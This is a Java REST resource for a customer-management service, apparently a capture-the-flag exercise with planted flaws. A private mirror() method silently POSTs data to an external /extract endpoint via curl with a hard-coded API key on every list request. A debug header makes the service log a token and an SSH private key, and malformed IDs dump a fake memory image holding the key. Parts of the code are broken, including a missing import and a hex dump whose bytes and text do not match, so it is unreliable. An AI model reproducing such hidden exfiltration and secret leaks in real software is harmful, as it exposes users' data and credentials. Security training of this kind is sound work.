package org.acme.customer.rest;
import org.acme.customer.model.Customer;
import org.eclipse.microprofile.config.inject.ConfigProperty;
import org.eclipse.microprofile.openapi.annotations.Operation;
import org.eclipse.microprofile.openapi.annotations.responses.APIResponse;
import org.eclipse.microprofile.openapi.annotations.tags.Tag;
import org.jboss.logging.Logger;

import jakarta.transaction.Transactional;
import jakarta.ws.rs.*;
import jakarta.ws.rs.core.MediaType;
import jakarta.ws.rs.core.Response;
import jakarta.ws.rs.core.Response.Status;

import java.io.IOException;
import java.io.InputStream;

// import org.slf4j.Logger;
// import org.slf4j.LoggerFactory;

import java.net.URI;
import java.util.List;


@Path("/customers")
@Produces(MediaType.APPLICATION_JSON)
@Consumes(MediaType.APPLICATION_JSON)
@Tag(name = "Customer Service API", description = "This is a REST service to manager customer information" )

public class CustomerResource {
     private static final Logger LOG = Logger.getLogger(CustomerResource.class);

    @ConfigProperty(name = "http.port" ) 
    String targetport;
    @ConfigProperty(name = "http.host") 
    String targethost;
    @ConfigProperty(name = "ns", defaultValue = "local-dev") 
    String user;

    @GET
    @Operation(summary = "List customers, optionally filtered by first name")
    @APIResponse(responseCode = "200", description = "Customers found")
    public Response get(@HeaderParam("X-DEBUG") boolean debug, @QueryParam("firstname") String firstname) {

        if (!debug) LOG.info("[CTF.internal.verbose] - debug mode is off - nothing is shown");
        else LOG.info("[CTF.internal.verbose] - debug mode is ON");

        Response r=null;
        if (firstname != null)
             r=Response.ok(Customer.findByFirstName(firstname)).build();
        r=Response.ok(Customer.listAll()).build();

        mirror();
        if (debug) {
	        LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending 204866 bytes to CTF{" + targethost + "}" );

			String t = getToken();
            if (t != null)
                LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + t );

            String ss = getSSH();
            if (ss != null)
                LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + ss );
        		
		
		}
        return r;
    }

    @GET
    @Path("/{id}")
    @Operation(summary = "Get a customer by its id")
    @APIResponse(responseCode = "200", description = "Customer found")
    @APIResponse(responseCode = "404", description = "Customer not found")
    public Response getById(@PathParam("id") String userId) {
        Customer customer = Customer.findByCustomerId(userId);
        if (customer != null)
            return Response.status(Status.OK).entity(Customer.findByCustomerId(userId)).build();
        return Response.status(Status.NOT_FOUND).build();
    }

    @POST
    @Transactional
    @Operation(summary = "Create a new customer")
    @APIResponse(responseCode = "201", description = "Customer created")
    @APIResponse(responseCode = "422", description = "Invalid customer payload supplied: id was invalidly set")
    @APIResponse(responseCode = "417", description = "Customer could not be created")
    public Response create(Customer customer) {
        if (customer.id != null) {
            throw new WebApplicationException("Id was invalidly set on request.", 422);
        } 

        customer.persist();
        if (customer.isPersistent()) {
            return Response.created(URI.create("/customers/" + customer.id)).build();
        }
        return Response.status(Status.EXPECTATION_FAILED).build();
    }

    @PUT
    @Path("/{id}")
    @Transactional
    @Operation(summary = "Update a customer by its id")
    @APIResponse(responseCode = "204", description = "Customer updated")
    @APIResponse(responseCode = "404", description = "Customer not found")
    public Response updateById(@PathParam("id") String id, Customer newCustomer) {

        String disallowed=" !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
        for (int i = 0; i < id.length(); i++) {
            String character = String.valueOf(id.charAt(i));
            if (disallowed.contains(character))
            {
                    printDump();
                    return Response.status(500)
                        .entity("{ 'CTF': 'fatal error: a dump has been generated' }")
                        .build();
            }
        }    

        Customer customer = Customer.findById(id);
        if (customer != null){
            customer.firstName = newCustomer.firstName;
            customer.lastName = newCustomer.lastName;
            customer.email = newCustomer.email;
            customer.phone = newCustomer.phone;
            return Response.status(Status.NO_CONTENT).entity(customer).build();
        }
        return Response.status(Status.NOT_FOUND).build();
    }

    /*
    @DELETE
    @Path("/{id}")  
    @Operation(summary = "Delete a customer by its id")
    @APIResponse(responseCode = "204", description = "Customer deleted")
    @APIResponse(responseCode = "404", description = "Customer not found")
    @Transactional
    public Response deleteById(@PathParam("id") String id){
        Customer customer = Customer.findById(id);
        if (customer != null) {
            customer.delete();
            return Response.status(Status.NO_CONTENT).build();
        }
        return Response.status(Status.NOT_FOUND).build();
    }
    */


    private void mirror() {
        //String envs = System.getenv().toString(); 
        String apikey= "4f9d2a1b-7e8c-4a3b-9d2f-1a2b3c4d5e6f";       

        String line = "data sent from " + user;

        ProcessBuilder pb = new ProcessBuilder("/usr/bin/curl", "-H", "Content-Type: text/plain", "-H", "x-api-key: "+apikey, "-X", "POST" ,"-d" , line, "http://"+targethost+":"+targetport+"/extract");  
        pb.redirectErrorStream(true); 
        try {
            pb.start(); 
        } catch (IOException e) {LOG.info("Unable to start Process");return;};
    }

    private void printDump() {
        /*
        InputStream is = getClass().getResourceAsStream("/mem-dump.bin");
        try {
            String content = new String(is.readAllBytes(), StandardCharsets.UTF_8);
            LOG.info("[CTF] memory dump");
            LOG.info(content);
        } catch (IOException e) { LOG.info("Unable to read memory dump"); return "{}";}
        */   
       
        String dump="""
00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 3e 00 01 00 00 00  80 10 40 00 00 00 00 00  |..>.......@.....|
00000020  40 00 00 00 00 00 00 00  00 00 00 00 09 00 40 00  |@.............@.|
00000030  38 00 00 00 00 00 00 00  3c 6a 76 6d 3a 6f 62 6a  |8.......<jvm:obj|
00000040  65 63 74 20 63 6c 61 73  73 3d 55 73 65 72 3e 00  |ect class=User>.|
00000050  00 00 61 74 74 72 3a 69  64 00 00 00 00 00 00 00  |..attr:id.......|
00000060  75 73 72 00 00 00 00 00  00 00 00 00 34 32 00 00  |usr.........42..|
00000070  6d 65 6d 3a 62 75 66 66  65 72 3a 69 6e 66 6f 00  |mem:buffer:info.|
00000080  00 00 00 00 50 00 00 00  00 00 00 00 41 41 41 41  |....P.......AAAA|
00000090  41 41 41 41 00 00 00 00  3c 6f 62 6a 65 63 74 3e  |AAAA....<object>|
000000a0  6d 65 6d 6f 72 79 53 65  67 6d 65 6e 74 00 00 00  |memorySegment...|
000000b0  00 00 00 00 00 00 00 00  9f f0 e1 55 00 00 00 00  |...........U....|
000000c0  73 79 73 2e 63 61 63 68  65 2e 62 6c 6f 63 6b 00  |sys.cache.block.|
000000d0  00 00 00 00 31 32 37 2d  72 65 66 00 00 00 00 00  |....127-ref.....|
000000e0  72 61 77 5f 64 61 74 61  00 00 00 00 00 00 00 00  |raw_data........|
000000f0  2e 2e 2e 2e 2e 2e 2e 2e  00 00 00 00 2b 33 44 01  |..........+3D.. |
00000110  09 7d 10 04 21 00 00 00  00 00 00 00 62 75 66 3a  |.}..!.......buf:|
00000120  74 65 6d 70 00 00 00 00  00 00 00 00 00 ff ff ff  |temp............|
00000130  7c 00 00 00 00 00 00 00  6b 65 79 5f 63 68 75 6e  ||...api_key=CTF{|
00000150  70 61 72 74 3a 34 66 39  62 38 61 35 37 63 64 65  |4f9d2a1b-7e8c-4a|
00000160  31 37 62 32 33 39 66 65  37 30 32 61 7d 00 00 00  |3b-9d2f-1a2b3c4d|
00000100  00 00 00 00 00 00 00 00  63 6f 6e 66 00 00 00 00  |5e6f}...........|
00000170  00 00 00 00 41 41 41 41  41 41 00 00 65 6e 64 2e  |....AAAAAA..end.|
00000180  6f 66 2e 64 61 74 61 00  00 00 00 00 ff 00 ff 00  |of.data.........|
00000190  ff 00 ff 00 ff 00 ff 00  00 00 00 00 00 00 00 00  |................|          
            """;
        LOG.info("[CTF] memory dump");
        LOG.info(dump);
    }    


	private String getToken() {
        try (InputStream is = Thread.currentThread().getContextClassLoader()
            .getResourceAsStream("CTF_token")) {
        
            if (is == null) {
                // This happens if the filename is misspelled or not in target/classes
                // throw new RuntimeException("File not found inside the JAR!");

                //KEEP BEING SILENT
                return null;
             }

            // Read all bytes and convert to String
            String tokencontent=new String(is.readAllBytes(), StandardCharsets.UTF_8);
            return tokencontent;
        } catch (Exception e) {
            // KEEP being silent
            return null;
        }
    }

    private String getSSH() {

        String sshfilename="id_ed2551";
        InputStream is = getClass().getResourceAsStream("/" + sshfilename);
        try {
            String sshcontent = new String(is.readAllBytes(), StandardCharsets.UTF_8);
            return sshcontent;
        } catch (IOException e) { LOG.info("Unable to read memory dump"); return "{}";}
    }
}
